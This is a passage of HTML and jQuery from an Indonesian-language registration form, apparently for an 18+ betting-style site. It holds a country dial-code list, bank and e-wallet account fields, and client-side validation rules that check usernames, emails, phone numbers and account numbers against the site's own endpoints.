                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="353">Ireland (+353)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="44">Isle of Man (+44)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="972">Israel (+972)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="39">Italy (+39)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1876">Jamaica (+1876)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="81">Japan (+81)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="44">Jersey (+44)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="962">Jordan (+962)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="7">Kazakhstan (+7)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="254">Kenya (+254)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="686">Kiribati (+686)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="850">Korea, Democratic People's Republic of (+850)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="82">Korea, Republic of (+82)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="381">Kosovo (+381)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="965">Kuwait (+965)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="996">Kyrgyzstan (+996)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="856">Lao People's Democratic Republic (+856)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="371">Latvia (+371)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="961">Lebanon (+961)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="266">Lesotho (+266)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="231">Liberia (+231)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="218">Libyan Arab Jamahiriya (+218)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="423">Liechtenstein (+423)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="370">Lithuania (+370)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="352">Luxembourg (+352)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="853">Macao (+853)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="389">Macedonia, the Former Yugoslav Republic of (+389)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="261">Madagascar (+261)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="265">Malawi (+265)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="960">Maldives (+960)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="223">Mali (+223)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="356">Malta (+356)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="692">Marshall Islands (+692)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="596">Martinique (+596)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="222">Mauritania (+222)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="230">Mauritius (+230)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="269">Mayotte (+269)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="52">Mexico (+52)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="691">Micronesia, Federated States of (+691)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="373">Moldova, Republic of (+373)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="377">Monaco (+377)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="976">Mongolia (+976)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="382">Montenegro (+382)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1664">Montserrat (+1664)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="212">Morocco (+212)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="258">Mozambique (+258)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="95">Myanmar (+95)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="264">Namibia (+264)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="674">Nauru (+674)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="977">Nepal (+977)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="31">Netherlands (+31)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="599">Netherlands Antilles (+599)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="687">New Caledonia (+687)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="64">New Zealand (+64)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="505">Nicaragua (+505)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="227">Niger (+227)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="234">Nigeria (+234)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="683">Niue (+683)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="672">Norfolk Island (+672)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1670">Northern Mariana Islands (+1670)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="47">Norway (+47)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="968">Oman (+968)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="92">Pakistan (+92)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="680">Palau (+680)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="970">Palestinian Territory, Occupied (+970)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="507">Panama (+507)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="675">Papua New Guinea (+675)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="595">Paraguay (+595)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="51">Peru (+51)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="64">Pitcairn (+64)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="48">Poland (+48)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="351">Portugal (+351)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1787">Puerto Rico (+1787)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="974">Qatar (+974)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="262">Reunion (+262)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="40">Romania (+40)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="70">Russian Federation (+70)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="250">Rwanda (+250)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="590">Saint Barthelemy (+590)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="290">Saint Helena (+290)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1869">Saint Kitts and Nevis (+1869)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1758">Saint Lucia (+1758)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="590">Saint Martin (+590)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="508">Saint Pierre and Miquelon (+508)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1784">Saint Vincent and the Grenadines (+1784)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="684">Samoa (+684)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="378">San Marino (+378)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="239">Sao Tome and Principe (+239)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="966">Saudi Arabia (+966)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="221">Senegal (+221)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="381">Serbia (+381)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="381">Serbia and Montenegro (+381)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="248">Seychelles (+248)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="232">Sierra Leone (+232)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1">Sint Maarten (+1)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="421">Slovakia (+421)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="386">Slovenia (+386)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="677">Solomon Islands (+677)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="252">Somalia (+252)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="27">South Africa (+27)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="500">South Georgia and the South Sandwich Islands (+500)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="211">South Sudan (+211)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="34">Spain (+34)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="94">Sri Lanka (+94)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="249">Sudan (+249)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="597">Suriname (+597)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="47">Svalbard and Jan Mayen (+47)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="268">Swaziland (+268)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="46">Sweden (+46)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="41">Switzerland (+41)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="963">Syrian Arab Republic (+963)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="886">Taiwan, Province of China (+886)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="992">Tajikistan (+992)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="255">Tanzania, United Republic of (+255)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="670">Timor-Leste (+670)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="228">Togo (+228)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="690">Tokelau (+690)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="676">Tonga (+676)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1868">Trinidad and Tobago (+1868)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="216">Tunisia (+216)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="90">Turkey (+90)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="7370">Turkmenistan (+7370)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1649">Turks and Caicos Islands (+1649)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="688">Tuvalu (+688)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="256">Uganda (+256)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="380">Ukraine (+380)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="971">United Arab Emirates (+971)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="44">United Kingdom (+44)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1">United States (+1)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1">United States Minor Outlying Islands (+1)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="598">Uruguay (+598)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="998">Uzbekistan (+998)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="678">Vanuatu (+678)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="58">Venezuela (+58)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1284">Virgin Islands, British (+1284)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="1340">Virgin Islands, U.s. (+1340)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="681">Wallis and Futuna (+681)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="212">Western Sahara (+212)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="967">Yemen (+967)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="260">Zambia (+260)</a></li>
                                                                        <li><a class="js-opt" href="javascript:void(0);" data-value="263">Zimbabwe (+263)</a></li>
                                            
                    
                    </ul>
                    </div><!-- /input-group-btn  --> 
                   

                    <input type="tel" class="form-control" placeholder="" id="mobile_no" name="mobile_no" required="" autocomplete="off" maxlength="20" style="border-radius: 0 5px 5px 0;">
                    <div class="loader-b" id="mobile-validate-loader" style="position: absolute; display: block; top: 3px; right: 23px; width: 10px; height: 10px; left: inherit; display:none;"></div>
                    </div>
                    <small class="text-left">
                        * Silakan isi nomor telepon tanpa angka 0                    </small>
                    <small class="text-left">
                        * cth: 812345678
                    </small>
                </div>
            </div>
                                                  
                     
                                  
                                                       

            <div class="form-group " id="refCode_formgrp">
                <div class="col-xs-5  col-md-5">
                    <label>Kode Referensi / Afiliasi</label>
                </div>
                                    <div class="col-xs-7  col-md-7">                       
                        <input type="text" class="form-control" id="refCodeInput" name="ref_code" maxlength="50" autocomplete="off">
                        <small class="text-left">(Optional) Kosongkan jika tidak ada </small>
                    </div>
                            </div>
            
                        <div class="form-group">
                <div class="col-xs-4 text-right" style="padding-top:15px">
                </div>
                <input type="hidden" value="1" name="isRegHasBank">
                                <div class="col-xs-8 text-right" style="padding-top: 15px; display: none;" id="register_form_two_next_btn">
                    <button type="button" class="btn btn-secondary next_btn">Lanjut</button>
                </div>
                            </div>

       </div>
       <div class="register_form_two" style="display: block;">
            <input type="hidden" value="1" name="isRegHasBank">
                        <div class="sub-title">Informasi bank</div>
            <div class="form-group">
                <div class="col-md-5">
                    <label>Nama Sesuai Rekening</label>
                </div>
                <div class="col-md-7">
                    <input type="text" class="form-control" id="name1" placeholder="" name="acc_name" maxlength="100">
                    <small class="text-left">* Nama yang terdaftar harus sesuai dengan nama rekening bank yang digunakan untuk menyetor dan menarik dana.</small>
                </div>
            </div>
            <div class="form-group">
                <div class="col-md-5 ">
                    <label for="method" style="padding-top: 7.5px;">Jenis Akun Transaksi<span class="text-danger">*</span></label>
                </div>
                <div class="col-md-7">
                    <div class="row">
                                                <div class="col-xs-6 radio_2">
                        <input class=" " name="method" id="radioBank5" checked="" type="radio" value="5">
                        <label class=" " for="radioBank5">
                        <span class="radio-title">
                        Bank                        </span>
                        <span class="marked">
                        <i class="icon-checkmark"></i>
                        </span>
                        </label>
                        </div>
                                                                        <div class="col-xs-6 radio_2">
                        <input class=" " name="method" id="radioEwallet7" type="radio" value="7">
                        <label class="" for="radioEwallet7">
                        <span class="radio-title">
                        E-wallet                        </span>
                        <span class="marked">
                        <i class="icon-checkmark"></i>
                        </span>
                        </label>
                        </div>
                                            </div>
                </div>
            </div>
            <div class="form-group" id="isShowBankOptions">
                <div class="col-md-5">
                    <label>Bank</label>
                </div>
                <div class="col-md-7">
                    <select class="form-control" data-plugin="bank_list" id="bankOpts--register" name="bank_name">
                        <option selected="" value="">- Silahkan pilih -</option>
                                                                        <option value="BCA" data-bcode="BCA">BCA</option>
                                                <option value="BNI" data-bcode="BNI">BNI</option>
                                                <option value="MANDIRI" data-bcode="MDR">MANDIRI</option>
                                                <option value="CIMB" data-bcode="CIMBN">CIMB</option>
                                                <option value="BRI" data-bcode="BRI">BRI</option>
                                                <option value="MAYBANK" data-bcode="MBBIN">MAYBANK</option>
                                                <option value="DANAMON" data-bcode="DMN">DANAMON</option>
                                                <option value="OCBC" data-bcode="OCBCN">OCBC</option>
                                                <option value="BSI" data-bcode="BSIN">BSI</option>
                                                                    </select>
                </div>
            </div>
            <div class="form-group" id="isShowEwalletOptions" style="display:none;">
                <div class="col-md-5">
                    <label>E-wallet</label>
                </div>
                <div class="col-md-7">
                    <select class="form-control" data-plugin="bank_list" id="ewalletOpts--register" name="bank_name" disabled="">
                        <option selected="" value="">- Silahkan pilih -</option>
                        
                                                <option value="DANA">DANA</option>
                                                <option value="OVO">OVO</option>
                                                <option value="GOPAY">GOPAY</option>
                                                <option value="LINKAJA">LINKAJA</option>
                                                <option value="SAKUKU">SAKUKU</option>
                                                <option value="SHOPEE PAY">SHOPEE PAY</option>
                                                <option value="DOKU">DOKU</option>
                                                <option value="SEABANK">SeaBank</option>
                                                
                    </select>
                </div>
            </div>
            <div class="form-group">
                <div class="col-md-5">
                    <label id="isShowBankLable">No. Rekening Bank</label>
                    <label id="isShowEwalletLable" style="display:none;">No. E-Wallet</label>
                </div>
                <div class="col-md-7">
                    <input type="tel" class="form-control " placeholder="" name="acc_no" id="acc_no" required="" autocomplete="off" minlength="8" maxlength="20">
                    <div class="loader-b" id="accno-validate-loader" style="position: absolute; display: block; top: 3px; right: 23px; width: 10px; height: 10px; left: inherit; display:none;z-index:10;"></div>
                    <small class="text-left isShowEwalletMsg" style="display:none">* Silakan isi nomor E-Wallet dengan menggunakan 0</small>
                    <small class="text-left isShowEwalletMsg" style="display:none">* contoh : 08213456789</small>
                    <small class="text-left">* Pastikan rekening anda Valid, Aktif, dan belum terdaftar di situs ini</small>
                </div>
            </div>
            

                </div>
                                        <div class="form-group form-check submit-box">
                            <div class="col-md-12">
                    <div class="checkbox">
                        <label><input type="checkbox" id="terms" name="terms" value="on"> 
                        &nbsp;
                        Dengan memilih tombol DAFTAR, saya menyatakan bahwa saya berusia 18 tahun atau lebih. Saya telah membaca dan menyetujui Syarat &amp; Ketentuan. Lihat                        <a href="https://semangatMERCUSUAR77.site/info/terms-terms_conditions" target="_blank">Syarat &amp; Ketentuan </a>
                        </label>
                    </div>
                </div>
                                <div class="col-md-12">
                    <div class="checkbox">
                    <label> 
                      <input type="checkbox" id="RememberMe" name="remember_me" value="1" checked="">
                      <p class="text-left"> Ingat saya </p>
                  </label> 
                  </div> 
                </div> 
            </div>
            <div class="form-group">
                <div class="col-xs-4 text-right" style="padding-top: 15px; display: none;" id="register_form_two_prev_btn">
                    <button type="button" class="btn btn-tertiery prev_btn">Sebelumnya</button>
                </div>
                 <div class="text-right col-xs-12" style="padding-top:15px;">
                  <button type="submit" onclick="this.form.submit();" class="btn btn-secondary" id="register_form_two_submit_btn">
                   DAFTAR
                  </button>
              </div>
            </div>

            

        </div>
    </form>

            <script type="text/javascript">
     $(document).ready(function () {

        fileUploadReceipt('.file-drop-area-proof');
        fileUploadReceipt('.file-drop-area-proof-selfie'); 

        function fileUploadReceipt(className){
                var droppedFiles = false;
                $(className).on('drag dragstart dragend dragover dragenter dragleave drop', function(e) {
                    e.preventDefault();//
                    e.stopPropagation();
                })
                .on('dragover dragenter', function() {
                    $(this).addClass('is-dragover');
                })
                .on('dragleave dragend drop', function() {
                    $(this).removeClass('is-dragover');
                })
                .on('drop', function(e) {
                    droppedFiles = e.originalEvent.dataTransfer.files;
                    $(this).find('input[type="file"]').prop('files', droppedFiles);

                    if(droppedFiles){
                    $(this).find('.file-msg').html(droppedFiles[0].name);
                    }
                    else{

                        $(this).find('.file-msg').html('   or drag and drop file here');
                    }
                });

                $(className+' input[type="file"]').on('change', function(e) {
                    var file = e.target.files;
                    if(file){
                        var fileName= file[0]?file[0].name : '   or drag and drop file here' ;

                        $(className+' .file-msg').html(fileName);
                    }
                    else{
                        $(className+' .file-msg').html('   or drag and drop file here');
                    }
                })
            }
                var register_form_no_steps = 1;
        var is_register_need_acc = "1" ? 1  : 0;
if(register_form_no_steps == 1){
    $('.btn-refresh-captcha').trigger('click');
    $('.register_form_two').css('display','block');
    $('#register_form_two_next_btn').css('display','none');
    $('#register_form_two_prev_btn').css('display','none');

    $("#stage_val").val(parseInt('1'));

    if(is_register_need_acc == 1){
        $('#register_form_two_btn').css('display','none');
        $('#register_form_two_submit_btn').removeClass('col-xs-8').addClass("col-xs-12");
    }
}
        /*setting minlength 10 for mobile number to IDR */
        var mob_minlength = 5;
        if(window.currencyCode == 'IDR'){
            mob_minlength = 10;
        }
        /*setting minlength 10 for mobile number to IDR */
        

var formSteps= parseInt('1');//count fr  0
var pwd_regex = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d!@#$%^&*()_+]{8,50}$/;
var accname_regex = /^\s{0,1}[a-zA-Z-.\/,']+(?:\s[a-zA-Z-.\/,']+)*\s{0,1}$/;
var accname_requirement =  "Full name hanya dapat terdiri dari abjad";
var ref_code = "";
var app_sub_skin = "kixplay";


if( !!ref_code ){
          sessionStorage.setItem('refCode', ref_code);
          $('#refCode_formgrp').show();
}else {
    var refCode = sessionStorage.getItem('refCode');
     if(!!refCode){
         $('#refCodeInput').val(refCode);
         $('#refCodeInput').val(refCode).attr('readonly', true);
         $('#txt-refCode__reg').text(refCode);
         $('#refCode_formgrp').show();
      }
}

// var captcha_v=1;
// $('#registerfreshCaptcha').click(function(e){
  
//     captcha_v++;
//     e.preventDefault();
//     e.stopPropagation();
//     $("#registerCaptchaimg").val('');
//     var url ='https://semangatMERCUSUAR77.site/captcha-image-register?v='+ Date.now() + Math.floor(Math.random() * 100000000);
//     $('#Captchaimga').attr("src",url);

// })
$('.btn-refresh-captcha').on( 'click', function(e){
e.preventDefault();
e.stopPropagation(); 
$('input[name="registerCaptchaimg"]').val('');

var $captchaImg = $(this).parent().find('img');
var curCapUrl = $captchaImg.attr("data-url");
var url = curCapUrl + Date.now() + Math.floor(Math.random() * 100000000);
$captchaImg.attr("src",url);

});


$('input[name=method]').change(function(){
        $('#bankOpts--register').val(null);
        $('#ewalletOpts--register').val(null);
        $("#acc_no").val(null);
        const selectedValue = $('input[type=radio][name=method]:checked').val();

        if(selectedValue == '7'){
            $('#isShowBankOptions,#isShowBankLable').hide();
            $('#isShowEwalletOptions,#isShowEwalletLable').show();
            $('.isShowEwalletMsg').show();
            
            $('#bankOpts--register').prop('disabled',true);
            $('#ewalletOpts--register').prop('disabled',false);
            $("#acc_no").attr("minlength", '10');
                        $("#acc_no").attr("maxlength", "20");
        }
        else {
            $('#isShowBankOptions,#isShowBankLable').show();
            $('#isShowEwalletOptions,#isShowEwalletLable').hide();
            $('.isShowEwalletMsg').hide();
            $('#bankOpts--register').prop('disabled',false);
            $('#ewalletOpts--register').prop('disabled',true);
            $("#acc_no").attr("minlength", window.accLength);
       }
}).trigger('change');

var thankyou = "Terima kasih atas pendaftaran Anda";
var email_regex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/i;
var captchaCode = $('#6_letters_code').val();
var datastring = "6_letters_code=" + captchaCode;
var username = $("#username").val();
var acc_no = $("#acc_no").val();
var securecode = $("#captcha").val();
var email_id = $("#email_id").val();
var mobile_no = $("#mobile_no").val();
var social_media_username = $("#social_media_username").val();
var birthDate = $("#birthDate").val();


function isInputSuccess(selector){
                return $(selector + ".has-success:not(.pending)").length>0;
            }
             
            $('#ddl-contact-country .js-opt').on('click',function(e){
                e.preventDefault();
                e.stopPropagation();
              
                let val = $(this).data('value');  
                $('input[name=contact_country]').val(val);
                $('#txt-contact-country').text('+' + val);
                $('#def-ctrycontact-opt').text( $(this).text()).data( 'value', val); 
                $(this).parents('.input-group-btn').removeClass('open');
            }); 
            $regi_validator= $("#registerForm1").validate({
    rules: {
        acc_name: {

required: true,
pattern : accname_regex,
//pattern: /^[a-z A-Z]+$/,
minlength : 3
},

user_name:{
required: true,
minlength:6,
maxlength:12,
pattern: /^[a-zA-Z0-9]+$/,
remote : {
url:"/checkUserNameAvailability",
 type: "post",
 headers: {
     'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
 },
}
},
ref_code:{
maxlength:50,
pattern: /^[a-zA-Z0-9]+$/,  
remote : {
url:"/checkRefCodeAvailability",
 type: "post",
 headers: {
     'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
 },
}
},

acc_no: {
    required: function(){
        return window.isRegWAcc ;
    },
    minlength:function(element) {
        var bankAccLimit = $("#acc_no").attr('minlength');
               return $("#acc_no").attr('minlength');
    },
    maxlength: function(element) {
        return $("#acc_no").attr('maxlength');
    },
    pattern: /^[0-9]+$/,
    remote: {
                 url: "/checkAccNo",
                 type: "post",
                 dataType: "json",
                 async: true,
                 data: {
                           method: function() {
                                return $( '#registerForm1 input[type=radio][name=method]:checked').val();
                            }
                    },
                   complete: function(data)
                                    {
                                        if($('#acc_no').hasClass('pending')){
                                            $('#accno-validate-loader').hide();
                                        }
                                    },
                 headers: {
                     'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
                 },
             }
},
bank_name: {
    required: function(){
        return window.isRegWAcc ;
    },
},
        password: {
            required: true ,
            minlength:8,
            maxlength:20,
            pattern: pwd_regex
        },
        password_confirm: {required: true, equalTo: '#password_1' },
        email :{
            required: true ,
            email: true,
            remote: {
                         url: 'https://semangatMERCUSUAR77.site/checkExistingEmail',
                         type: "post",
                         dataType: "json",
                         async: true,
                                     complete: function(data)
                                        {
                                            if(!$('#email').hasClass('pending')){
                                              $('#email-validate-loader').hide();
                                            }
                                        },
                        //  headers: {
                        //      'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
                        //  },
                     }
        },
        mobile_no :{
            required: true ,
            minlength: mob_minlength,
            pattern: /^[1-9][0-9]{4,19}$/, 
            remote: {
                         url: 'https://semangatMERCUSUAR77.site/checkExistingMobile',
                         type: "post",
                         dataType: "json",
                         async: true,
                                     complete: function(data)
                                        {
                                            if(!$('#mobile_no').hasClass('pending')){
                                              $('#mobile-validate-loader').hide();
                                            }
                                        },
                        //  headers: {
                        //      'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
                        //  },
                     }
        },
         social_media_username :{
                        required: false ,
                        pattern: /^[^\s]+$/,
                         remote: {
                                     url: 'https://semangatMERCUSUAR77.site/checkSocialUsernameAvailability',
                                     data: {
                                        social_media_name: function () {
                                            return $("#social_media_name").val(); 
                                        },
                                        social_media_username: function () {
                                            return $("#social_media_username").val();
                                        }
                                     },
                                     type: "post",
                                     dataType: "json",
                                     async: true,
                                     complete: function(data)
                                        {
                                            if(!$('#social_media_username').hasClass('pending')){
                                                $('#social_media_username-validate-loader').hide();
                                            }
                                        },
                                 }
                    },
        terms :{
                        required: true ,
                    },
        captcha:{
            required: true ,
    minlength:4,
    maxlength:4,
    remote: {
                 url: "/checkFormCaptcha",
                 type: "post",
                 dataType: "json",
                 complete: function(data)
                    {
                        // console.log(data); 
                       if(data.responseJSON =="refreshCaptcha")
                            $('.btn-refresh-captcha').trigger('click');
                    },
                //  headers: {
                //      'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
                //  },
             }
        },
        birthDate:{
                    dateISO: true,
        }, 
        occupation:{
                
        },
        source_fund:{
                
        }, 
        user_identification:{
                 extension: 'jpeg|jpg|png|bmp',
        
        }, 
        user_identification_selfie:{
                 extension: 'jpeg|jpg|png|bmp',
        
        },

    },
    // Specify validation error messages
    messages: {

        acc_name: {
            required: "Diperlukan Nama Lengkap",
            pattern: accname_requirement,
            minlength:"Diperlukan minimal 3 karakter",

        },
        user_name: {
            required: "Diperlukan Nama Akun",
            pattern:  "Nama akun hanya dapat terdiri dari huruf dan angka",
            minlength:"Diperlukan minimal 6 karakter",
            maxlength : "Maksimal 12 karakter saja",
            remote : "Nama Akun tidak tersedia"
        },
        acc_no: {
            required: "Diperlukan nomor rekening bank",
            pattern:  "Nomor rekening bank hanya dapat terdiri dari angka",
            // minlength:"Diperlukan minimal 8 karakter",
            minlength: function(element) {
                           var min_length =  $("#acc_no").attr('minlength');
                           var str = "Diperlukan minimal :acc_length karakter";
                           var minlength_msg = str.replace(":acc_length", min_length);
                           return minlength_msg;
            },
            maxlength : "Maksimal 20 karakter saja",
            remote : "Nomor Rekening Sudah Terdaftar"
        },
        bank_name: {
            required: "Bank Diperlukan",
        },
        password: {
            required: "Diperlukan Kata Sandi",
            minlength:"Diperlukan minimal 8 karakter",
            maxlength : "Maksimal 20 karakter saja",
        },
        password_confirm: {
            required: "Konfirmasi Kata Sandi Diperlukan",
            equalTo:"Konfirmasi Kata Sandi tidak sama dengan kata sandi",
        },
        email: {
            required: "Diperlukan Email",
            email:"Email tidak valid",
            remote : "Email tidak tersedia"
        },
        mobile_no: {
            required: "Diperlukan nomor ponsel",
            minlength:"Diperlukan minimal 10 angka",
